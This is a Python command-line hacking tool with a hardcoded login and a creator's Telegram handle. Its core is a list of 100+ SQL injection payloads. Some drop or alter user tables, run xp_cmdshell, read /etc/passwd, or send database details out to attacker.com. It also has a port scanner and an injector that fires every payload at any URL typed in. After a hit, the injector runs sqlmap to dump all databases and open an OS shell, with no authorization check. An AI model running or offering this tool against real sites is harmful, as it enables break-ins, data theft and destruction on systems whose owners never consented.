#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import requests
import re
import datetime
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Login credentials
USERNAME = "mrzxx"
PASSWORD = "123456"

# ASCII Art
LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

# =========================== SQL INJECTION PAYLOADS ===========================
# 100+ SQL Injection Payloads dengan berbagai metode
SQL_PAYLOADS = {
    # 1. Error Based SQL Injection
    "error_based": [
        "'", "''", "`", "``", "\"", "\"\"",
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR '1'='1' /*", "' OR '1'='1' -- -", "' OR '1'='1' #",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
        "' OR 1=1 -- -", "' OR 1=1; --", "' OR 1=1 LIMIT 1 --",
        "' OR 1=1 UNION SELECT NULL --", "' OR 1=1 UNION SELECT NULL,NULL --",
        "' OR 1=1 UNION SELECT NULL,NULL,NULL --",
        "' AND 1=1 --", "' AND 1=1 #", "' AND 1=1 /*",
        "' AND 1=1 -- -", "' AND 1=1; --",
        "' AND 1=2 --", "' AND 1=2 #", "' AND 1=2 /*",
        "' AND 1=2 -- -", "' AND SLEEP(5) --",
        "' AND SLEEP(10) --", "' AND BENCHMARK(1000000,MD5('test')) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(10)))a) --",
        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 --",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
    ],
    
    # 2. Union Based SQL Injection
    "union_based": [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--", "' UNION SELECT 1,2,3,4,5,6--",
        "' UNION SELECT @@version--", "' UNION SELECT user(),database()--",
        "' UNION SELECT @@version,user()--", "' UNION SELECT @@version,user(),database()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--",
        "' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables--",
        "' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT NULL,@@datadir--", "' UNION SELECT NULL,@@basedir--",
    ],
    
    # 3. Boolean Based Blind SQL Injection
    "boolean_based": [
        "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>0 --",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>0 --",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>0 --",
        "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a' --",
        "' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>0 --",
        "' AND EXISTS(SELECT * FROM information_schema.tables) --",
        "' AND EXISTS(SELECT * FROM users) --",
        "' AND (SELECT COUNT(*) FROM users)>0 --",
        "' AND (SELECT username FROM users LIMIT 1)='admin' --",
        "' AND (SELECT password FROM users WHERE username='admin') LIKE 'a%' --",
    ],
    
    # 4. Time Based Blind SQL Injection
    "time_based": [
        "' AND IF(1=1,SLEEP(5),0) --", "' AND IF(1=2,SLEEP(5),0) --",
        "' AND IF(ASCII(SUBSTRING((SELECT @@version),1,1))>0,SLEEP(5),0) --",
        "' AND IF(EXISTS(SELECT * FROM information_schema.tables),SLEEP(5),0) --",
        "' AND IF(EXISTS(SELECT * FROM users),SLEEP(5),0) --",
        "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(10)))a) --",
        "'; WAITFOR DELAY '00:00:05' --", "'; WAITFOR DELAY '00:00:10' --",
        "' OR SLEEP(5) --", "' OR SLEEP(10) --",
        "' OR pg_sleep(5) --", "' OR pg_sleep(10) --",
    ],
    
    # 5. Out of Band SQL Injection
    "out_of_band": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.',(SELECT user()),'.attacker.com\\\\test')) --",
        "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test'))) --",
        "' UNION SELECT @@version INTO OUTFILE '/tmp/version.txt' --",
        "' UNION SELECT @@version INTO DUMPFILE '/tmp/version.txt' --",
    ],
    
    # 6. Second Order SQL Injection
    "second_order": [
        "admin' --", "admin' #", "admin' /*",
        "admin' OR '1'='1", "admin' OR '1'='1' --",
        "test' OR 1=1 --", "test' UNION SELECT NULL --",
    ],
    
    # 7. Stacked Queries
    "stacked_queries": [
        "'; DROP TABLE users --", "'; DELETE FROM users --",
        "'; UPDATE users SET password='hacked' WHERE username='admin' --",
        "'; INSERT INTO users(username,password) VALUES('hacker','hacked') --",
        "'; CREATE TABLE hacked (data varchar(255)) --",
        "'; EXEC xp_cmdshell('whoami') --", "'; EXEC master..xp_cmdshell('whoami') --",
    ],
    
    # 8. Bypass Techniques
    "bypass": [
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "'/**/OR/**/1=1--", "'+OR+1=1--",
        "'%20OR%201=1--", "'%09OR%091=1--",
        "'%0AOR%0A1=1--", "'%0DOR%0D1=1--",
        "'%0COR%0C1=1--", "'%0BOR%0B1=1--",
        "'||1=1--", "'||'1'='1",
        "' OR '1'='1' || '", "' OR '1'='1' && '",
        "' UNION SELECT NULL,NULL,NULL--",
        "' /*!50000UNION*/ SELECT NULL,NULL,NULL--",
        "' /*!UNION*/ SELECT NULL,NULL,NULL--",
        "' /*!50000SELECT*/ NULL,NULL,NULL--",
        "' /*!50000SELECT*/ * FROM users --",
    ],
    
    # 9. XML Based
    "xml_based": [
        "' and extractvalue(1, concat(0x7e, (select @@version))) --",
        "' and updatexml(1, concat(0x7e, (select @@version)), 1) --",
        "' or extractvalue(1, concat(0x7e, (select user()))) --",
        "' or updatexml(1, concat(0x7e, (select database())), 1) --",
    ],
    
    # 10. JSON Based
    "json_based": [
        "{\"id\":\"' OR 1=1 --\"}", "{\"username\":\"admin' --\"}",
        "{\"password\":\"' OR '1'='1\"}", "{\"search\":\"' UNION SELECT NULL--\"}",
    ]
}

# Fungsi untuk mendapatkan semua payloads
def get_all_payloads():
    all_payloads = []
    for category in SQL_PAYLOADS.values():
        all_payloads.extend(category)
    return all_payloads

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_welcome():
    clear_screen()
    print(Fore.GREEN + "=" * 70)
    print(WELCOME_ASCII)
    print(Fore.GREEN + "=" * 70)
    time.sleep(2)

def login():
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.GREEN + " " * 20 + "LOGIN SYSTEM")
    print(Fore.GREEN + "=" * 50)
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.YELLOW + "[?] Username: " + Fore.WHITE)
        password = input(Fore.YELLOW + "[?] Password: " + Fore.WHITE)
        
        if username == USERNAME and password == PASSWORD:
            return username
        else:
            attempts -= 1
            print(Fore.RED + f"[!] Wrong credentials! {attempts} attempts remaining")
            time.sleep(1)
    
    return None

def port_scanner():
    clear_screen()
    print(Fore.GREEN + "=" * 60)
    print(Fore.CYAN + """
  ____            _     ____                  _           
 |  _ \ ___  _ __| |_  / ___|  ___ _ __   ___| |_ ___ _ __ 
 | |_) / _ \| '__| __| \___ \ / __| '_ \ / __| __/ _ \ '__|
 |  __/ (_) | |  | |_   ___) | (__| | | | (__| ||  __/ |   
 |_|   \___/|_|   \__| |____/ \___|_| |_|\___|\__\___|_|   
    """)
    print(Fore.GREEN + "=" * 60)
    
    target = input(Fore.YELLOW + "[?] Enter target IP or domain: " + Fore.WHITE)
    port_range = input(Fore.YELLOW + "[?] Enter port range (e.g., 1-1000): " + Fore.WHITE)
    
    try:
        start_port, end_port = map(int, port_range.split('-'))
    except:
        print(Fore.RED + "[!] Invalid port range format!")
        input(Fore.YELLOW + "[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Scanning ports...")
    print(Fore.CYAN + f"[+] Target: {target}")
    print(Fore.CYAN + f"[+] Port range: {start_port}-{end_port}")
    print(Fore.GREEN + "-" * 60)
    
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        
        try:
            result = sock.connect_ex((target, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Port {port}: OPEN")
                open_ports.append(port)
            else:
                print(Fore.RED + f"[-] Port {port}: CLOSED")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Port {port}: ERROR - {str(e)}")
        finally:
            sock.close()
    
    print(Fore.GREEN + "-" * 60)
    print(Fore.CYAN + f"[+] Scan completed!")
    print(Fore.CYAN + f"[+] Total open ports: {len(open_ports)}")
    if open_ports:
        print(Fore.CYAN + f"[+] Open ports: {', '.join(map(str, open_ports))}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def sql_injector():
    clear_screen()
    print(Fore.GREEN + "=" * 60)
    print(Fore.CYAN + """
  ____  _       _       ___       _            _   
 / ___|| | ___ | |__   |_ _|_ __ | |_ ___  ___| |_ 
 \___ \| |/ _ \| '_ \   | || '_ \| __/ _ \/ __| __|
  ___) | | (_) | |_) |  | || | | | ||  __/\__ \ |_ 
 |____/|_|\___/|_.__/  |___|_| |_|\__\___||___/\__|
    """)
    print(Fore.GREEN + "=" * 60)
    
    url = input(Fore.YELLOW + "[?] Enter target URL (e.g., http://example.com/page.php?id=1): " + Fore.WHITE)
    
    if not url.startswith('http'):
        print(Fore.RED + "[!] URL must start with http:// or https://")
        input(Fore.YELLOW + "[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Testing SQL Injection with 100+ payloads...")
    print(Fore.CYAN + f"[+] Target: {url}")
    print(Fore.CYAN + f"[+] Total payloads: {len(get_all_payloads())}")
    print(Fore.GREEN + "-" * 60)
    
    # Get all payloads
    all_payloads = get_all_payloads()
    
    vulnerable = False
    found_payloads = []
    found_errors = []
    
    for i, payload in enumerate(all_payloads):
        print(Fore.YELLOW + f"[*] Testing payload {i+1}/{len(all_payloads)}: {payload[:50]}...")
        
        # Create test URL
        if "?" in url:
            if "=" in url.split("?")[1]:
                test_url = url + payload
            else:
                test_url = url + "=" + payload
        else:
            test_url = url + "?id=" + payload
        
        try:
            response = requests.get(test_url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # Check for SQL error messages
            error_indicators = [
                "sql", "SQL", "syntax", "Syntax", "mysql", "MySQL",
                "oracle", "Oracle", "postgresql", "PostgreSQL", "mssql", "MSSQL",
                "database", "Database", "error", "Error", "warning", "Warning",
                "unclosed", "Unclosed", "quote", "Quote", "near", "Near",
                "at line", "You have an error", "supplied argument",
                "unknown column", "Unknown column", "table doesn't exist",
                "Table doesn't exist", "division by zero", "Division by zero",
                "expect", "Expect", "parameter", "Parameter", "type",
                "Type", "conversion", "Conversion", "invalid", "Invalid"
            ]
            
            for indicator in error_indicators:
                if indicator in response.text:
                    print(Fore.GREEN + f"[+] VULNERABLE! Payload: {payload}")
                    print(Fore.GREEN + f"[+] Error: {indicator}")
                    vulnerable = True
                    found_payloads.append(payload)
                    found_errors.append(indicator)
                    break
            
            # Check for different content length
            try:
                normal_response = requests.get(url, timeout=10)
                if len(response.text) > len(normal_response.text) + 100 or len(response.text) < len(normal_response.text) - 100:
                    print(Fore.YELLOW + f"[!] SUSPICIOUS response length with payload: {payload}")
                    print(Fore.YELLOW + f"[!] Normal: {len(normal_response.text)} chars, This: {len(response.text)} chars")
            except:
                pass
            
            # Check for time delays (time-based SQLi)
            if any(time_word in payload.lower() for time_word in ['sleep', 'waitfor', 'benchmark', 'pg_sleep']):
                print(Fore.CYAN + f"[*] Time-based payload detected: {payload}")
        
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[-] Error testing payload: {str(e)}")
        
        # Small delay to avoid overwhelming
        time.sleep(0.1)
    
    print(Fore.GREEN + "-" * 60)
    
    if vulnerable:
        print(Fore.GREEN + f"\n[+] SQL Injection vulnerabilities found: {len(found_payloads)}")
        print(Fore.GREEN + f"[+] Successful payloads:")
        for i, payload in enumerate(found_payloads[:5]):  # Show first 5
            print(Fore.CYAN + f"  {i+1}. {payload}")
        
        if len(found_payloads) > 5:
            print(Fore.CYAN + f"  ... and {len(found_payloads) - 5} more")
        
        # Ask if user wants to use sqlmap
        use_sqlmap = input(Fore.YELLOW + "\n[?] Do you want to use sqlmap for automated exploitation? (y/n): " + Fore.WHITE).lower()
        
        if use_sqlmap == 'y':
            print(Fore.CYAN + "\n[+] Running sqlmap with aggressive mode...")
            print(Fore.CYAN + "[+] This may take some time...")
            
            sqlmap_commands = [
                ["sqlmap", "-u", url, "--batch", "--level=5", "--risk=3", "--dbs"],
                ["sqlmap", "-u", url, "--batch", "--current-db"],
                ["sqlmap", "-u", url, "--batch", "--tables"],
                ["sqlmap", "-u", url, "--batch", "--dump-all", "--threads=10"],
                ["sqlmap", "-u", url, "--batch", "--os-shell"],
                ["sqlmap", "-u", url, "--batch", "--os-pwn"],
                ["sqlmap", "-u", url, "--batch", "--file-read=/etc/passwd"],
            ]
            
            for cmd in sqlmap_commands:
                print(Fore.YELLOW + f"\n[*] Running: {' '.join(cmd)}")
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    print(Fore.CYAN + result.stdout[:500])  # Show first 500 chars
                    if result.stderr:
                        print(Fore.RED + result.stderr[:500])
                except FileNotFoundError:
                    print(Fore.RED + "[!] sqlmap is not installed or not in PATH")
                    print(Fore.YELLOW + "[!] Install sqlmap: pip install sqlmap")
                    break
                except subprocess.TimeoutExpired:
                    print(Fore.RED + "[!] Command timed out")
                    continue
                except Exception as e:
                    print(Fore.RED + f"[!] Error running sqlmap: {str(e)}")
                    continue
    
    else:
        print(Fore.RED + "\n[-] No SQL Injection vulnerabilities found with automated testing")
        print(Fore.YELLOW + "[!] Try manual testing or different parameters")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def show_user_info(username):
    now = datetime.datetime.now()
    print(Fore.GREEN + "=" * 70)
    print(Fore.CYAN + f" Hallo: {username}")
    print(Fore.CYAN + f" Tanggal: {now.strftime('%d %B %Y')}")
    print(Fore.CYAN + f" Waktu: {now.strftime('%H:%M:%S')}")
    print(Fore.CYAN + f" Creator: mrzxx")
    print(Fore.CYAN + f" Telegram: @Zxxtirwd")
    print(Fore.GREEN + "=" * 70)

def main_menu(username):
    while True:
        clear_screen()
        print(MAIN_ASCII)
        show_user_info(username)
        print(Fore.CYAN + " " * 20 + "MULTI TOOL SYSTEM")
        print(Fore.GREEN + "=" * 70)
        print(Fore.YELLOW + "\n[1] SQL Injection Scanner + sqlmap (100+ payloads)")
        print(Fore.YELLOW + "[2] Port Scanner")
        print(Fore.YELLOW + "[3] Exit")
        print(Fore.GREEN + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE)
        
        if choice == "1":
            sql_injector()
        elif choice == "2":
            port_scanner()
        elif choice == "3":
            print(Fore.CYAN + "\n[+] Thank you for using this tool!")
            print(Fore.CYAN + "[+] Creator: mrzxx")
            print(Fore.CYAN + "[+] Telegram: @Zxxtirwd")
            print(Fore.CYAN + "[+] Exiting...")
            time.sleep(2)
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid choice!")
            time.sleep(1)

def main():
    try:
        # Show welcome screen
        show_welcome()
        
        # Login
        username = login()
        if not username:
            print(Fore.RED + "\n[!] Maximum login attempts reached!")
            print(Fore.RED + "[!] Access denied!")
            sys.exit(1)
        
        # Show main menu
        main_menu(username)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Check dependencies
    try:
        import colorama
        import requests
    except ImportError:
        print(Fore.RED + "[!] Installing required dependencies...")
        os.system("pip install colorama requests")
        print(Fore.GREEN + "[+] Dependencies installed!")
        time.sleep(2)
    
    # Check sqlmap
    try:
        subprocess.run(["sqlmap", "--version"], capture_output=True)
        print(Fore.GREEN + "[+] sqlmap detected!")
    except:
        print(Fore.YELLOW + "[!] sqlmap not found. Install with: pip install sqlmap")
        print(Fore.YELLOW + "[!] Some features may not work without sqlmap")
    
    main()
